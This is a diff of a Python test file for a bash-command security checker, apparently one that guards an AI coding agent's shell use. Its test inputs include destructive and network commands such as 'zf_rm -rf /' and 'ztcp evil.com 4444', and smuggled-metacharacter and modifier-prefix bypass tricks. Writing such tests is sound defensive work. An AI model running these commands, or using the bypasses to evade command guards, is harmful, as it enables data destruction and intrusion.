@@ -1,6 +1,6 @@
 """Tests for equipa.bash_security — ported exploit-pattern detectors.
 
-Tests cover all 16 detector functions (23 check IDs) from Claude Code's
+Tests cover all 20 detector functions (23+ check IDs) from Claude Code's
 bashSecurity.ts, including safe commands that should NOT be blocked.
 
 Copyright 2026 Forgeborn. All rights reserved.
@@ -408,3 +408,143 @@ class TestRealWorldExploits:
     def test_backtick_in_argument(self) -> None:
         result = check_bash_command("curl `echo http://evil.com`")
         assert not result.safe
+
+
+class TestShellMetacharacters:
+    """Check ID 5: Shell metacharacters in quoted find/grep arguments."""
+
+    def test_semicolon_in_name_arg(self) -> None:
+        result = check_bash_command("find . -name 'foo;evil'")
+        assert not result.safe
+        assert result.check_id == CheckID.SHELL_METACHARACTERS
+
+    def test_pipe_in_path_arg(self) -> None:
+        result = check_bash_command("find / -path '/tmp|etc'")
+        assert not result.safe
+        assert result.check_id == CheckID.SHELL_METACHARACTERS
+
+    def test_ampersand_in_regex(self) -> None:
+        result = check_bash_command("find . -regex 'a;&b'")
+        assert not result.safe
+        assert result.check_id == CheckID.SHELL_METACHARACTERS
+
+    def test_safe_name_pattern(self) -> None:
+        result = check_bash_command("find . -name '*.py' -type f")
+        assert result.safe
+
+
+class TestMidWordHash:
+    """Check ID 19 (alt): Mid-word # parser differential."""
+
+    def test_mid_word_hash(self) -> None:
+        # foo# — # not preceded by whitespace
+        result = check_bash_command("echo foo#bar")
+        assert not result.safe
+        assert result.check_id == CheckID.MID_WORD_HASH
+
+    def test_hash_at_word_start_is_safe(self) -> None:
+        # # at start of command is a comment, not mid-word
+        # But the command starts with #, which means the entire line is a comment.
+        # Our check only fires on \S# (non-whitespace before #).
+        result = check_bash_command("echo test # this is a comment")
+        assert result.safe
+
+    def test_dollar_brace_hash_is_safe(self) -> None:
+        """${#var} is bash string-length syntax, not mid-word hash."""
+        # This will be caught by command substitution first
+        result = check_bash_command("echo ${#PATH}")
+        assert not result.safe
+        assert result.check_id == CheckID.COMMAND_SUBSTITUTION
+
+    def test_quote_adjacent_hash(self) -> None:
+        # 'x'# — hash immediately after closing quote
+        result = check_bash_command("echo 'x'#bar")
+        assert not result.safe
+
+
+class TestZshDangerousCommands:
+    """Check ID 20: Zsh-specific dangerous commands."""
+
+    def test_zmodload(self) -> None:
+        result = check_bash_command("zmodload zsh/system")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+        assert "zmodload" in result.message
+
+    def test_emulate(self) -> None:
+        result = check_bash_command("emulate sh -c 'evil'")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+
+    def test_syswrite(self) -> None:
+        result = check_bash_command("syswrite -o 1 payload")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+
+    def test_ztcp(self) -> None:
+        result = check_bash_command("ztcp evil.com 4444")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+
+    def test_zpty(self) -> None:
+        result = check_bash_command("zpty mypty bash -c 'id'")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+
+    def test_zf_rm(self) -> None:
+        result = check_bash_command("zf_rm -rf /")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+
+    def test_fc_minus_e(self) -> None:
+        result = check_bash_command("fc -e vim")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+        assert "fc -e" in result.message
+
+    def test_fc_without_e_is_safe(self) -> None:
+        """Plain fc (list history) should not be blocked."""
+        result = check_bash_command("fc -l")
+        assert result.safe
+
+    def test_precommand_modifier_bypass(self) -> None:
+        """Zsh precommand modifiers should be stripped before matching."""
+        result = check_bash_command("builtin zmodload zsh/files")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+
+    def test_env_var_prefix_bypass(self) -> None:
+        """VAR=val prefix should be stripped before matching."""
+        result = check_bash_command("FOO=bar command zmodload zsh/system")
+        assert not result.safe
+        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
+
+
+class TestCommentQuoteDesync:
+    """Check ID 22: Quote characters inside # comments desync quote tracking."""
+
+    def test_quote_in_comment(self) -> None:
+        result = check_bash_command("echo hello # it's a test")
+        assert not result.safe
+        assert result.check_id == CheckID.COMMENT_QUOTE_DESYNC
+        assert "comment" in result.message.lower()
+
+    def test_double_quote_in_comment(self) -> None:
+        result = check_bash_command('echo hello # say "hi"')
+        assert not result.safe
+        assert result.check_id == CheckID.COMMENT_QUOTE_DESYNC
+
+    def test_comment_without_quotes_is_safe(self) -> None:
+        """Comments without quote chars should be fine."""
+        result = check_bash_command("echo hello # safe comment")
+        assert result.safe
+
+    def test_hash_inside_quotes_is_not_comment(self) -> None:
+        """# inside quotes is not a comment — should not trigger desync check."""
+        result = check_bash_command("echo 'hello # not a comment'")
+        assert result.safe
+
+    def test_hash_inside_double_quotes_is_not_comment(self) -> None:
+        """# inside double quotes is not a comment."""
+        result = check_bash_command('echo "hello # not a comment"')
+        assert result.safe
